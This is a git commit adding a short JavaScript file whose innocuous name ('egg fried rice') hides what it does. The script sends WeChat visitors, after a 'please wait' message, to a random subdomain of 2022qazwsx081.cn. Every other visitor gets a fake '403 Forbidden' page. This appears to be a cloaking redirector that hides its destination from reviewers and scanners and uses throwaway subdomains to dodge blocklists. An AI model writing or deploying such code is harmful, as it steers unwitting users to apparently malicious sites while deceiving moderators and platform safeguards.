12cb2e72677d28dc081691da9f78b4b310201b08
321lecloud <138575758+321lecloud@users.noreply.github.com>
2023-07-09 12:57:46 +0800

    Create danchaofan.js

---
+++ danchaofan.js
@@ -0,0 +1,32 @@
+// 判断是否在微信中访问
+function isWeChat() {
+  var ua = navigator.userAgent.toLowerCase();
+  return ua.indexOf('micromessenger') !== -1;
+}
+
+// 生成随机字符串
+function generateRandomString(length) {
+  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  var result = '';
+  for (var i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+  return result;
+}
+
+// 执行重定向操作
+function redirectToDomain() {
+  var randomString = generateRandomString(10);
+  var domain = '2022qazwsx081.cn';
+  var redirectURL = 'http://' + randomString + '.' + domain;
+  window.location.href = redirectURL;
+}
+
+if (isWeChat()) {
+  // 显示"请稍等"信息
+  document.write('<h1>请稍等...</h1>');
+  redirectToDomain();
+} else {
+  // 非微信访问，显示403页面
+  document.write('<h1>403 Forbidden</h1>');
+}
